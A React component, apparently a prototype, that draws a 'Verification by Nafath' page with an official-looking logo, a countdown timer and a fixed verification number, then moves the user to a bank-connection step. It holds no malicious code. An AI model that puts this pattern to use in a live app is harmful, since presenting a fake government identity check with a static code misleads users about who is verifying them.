
import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { ArrowLeft, Clock } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Progress } from '@/components/ui/progress';
import { useIsMobile } from '@/hooks/use-mobile';

const NafathVerification = () => {
  const [timeLeft, setTimeLeft] = useState(120); // 2 minutes in seconds
  const [verificationNumber, setVerificationNumber] = useState('71');
  const navigate = useNavigate();
  const isMobile = useIsMobile();

  // Timer countdown
  useEffect(() => {
    if (timeLeft <= 0) return;
    
    const timer = setInterval(() => {
      setTimeLeft(prevTime => prevTime - 1);
    }, 1000);
    
    return () => clearInterval(timer);
  }, [timeLeft]);

  // Format time as MM:SS
  const formatTime = () => {
    const minutes = Math.floor(timeLeft / 60);
    const seconds = timeLeft % 60;
    return `${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
  };

  // Calculate progress percentage
  const progressPercentage = (timeLeft / 120) * 100;

  const handleConfirm = () => {
    navigate('/bank-connection');
  };

  return (
    <div className="min-h-screen bg-white">
      <div className="container mx-auto px-4 py-8 sm:px-6 lg:px-8">
        <Button 
          variant="ghost" 
          onClick={() => navigate('/affordability-check')}
          className="mb-6"
          size={isMobile ? "sm" : "default"}
        >
          <ArrowLeft className="mr-2 h-4 w-4" />
          Back
        </Button>
        
        <div className="max-w-md mx-auto bg-white rounded-xl shadow-md overflow-hidden md:shadow-xl">
          <div className="p-6 md:p-8">
            <div className="flex flex-col items-center justify-center mb-8">
              <img 
                src="/lovable-uploads/9505a328-a74d-4a44-95f5-546b93ce1ec3.png" 
                alt="NIC Logo" 
                className="h-16 w-auto mb-6"
              />
              
              <h1 className="text-2xl font-bold text-center text-gray-800">
                Verification by Nafath
              </h1>
            </div>
            
            <div className="relative flex items-center justify-center mb-8">
              <div className="w-32 h-32 rounded-full border-[12px] border-gray-100 flex items-center justify-center">
                <span className="text-2xl font-bold text-gray-800">{formatTime()}</span>
              </div>
              <svg className="absolute top-0 left-0 w-32 h-32 -rotate-90">
                <circle
                  cx="64" 
                  cy="64" 
                  r="54"
                  stroke="#5EBEC4"
                  strokeWidth="12"
                  fill="transparent"
                  strokeDasharray={`${2 * Math.PI * 54}`}
                  strokeDashoffset={`${2 * Math.PI * 54 * (1 - progressPercentage / 100)}`}
                />
              </svg>
            </div>
            
            <div className="text-center mb-8">
              <p className="text-gray-700 mb-4">
                Please open the application and confirm the request by 
                choosing the number below for approval and then press 
                the confirm button below to complete registration
              </p>
              
              <div className="bg-[#5EBEC4] text-white text-4xl font-bold w-20 h-20 rounded-lg flex items-center justify-center mx-auto mb-6">
                {verificationNumber}
              </div>
            </div>
            
            <Button 
              onClick={handleConfirm} 
              className="w-full bg-[#5EBEC4] hover:bg-[#5EBEC4]/90 text-white h-12"
            >
              Click here to confirm
            </Button>
            
            <div className="flex items-center justify-center mt-6">
              <Clock className="h-4 w-4 text-gray-400 mr-2" />
              <p className="text-xs text-gray-500">
                This verification will expire in {formatTime()}
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default NafathVerification;
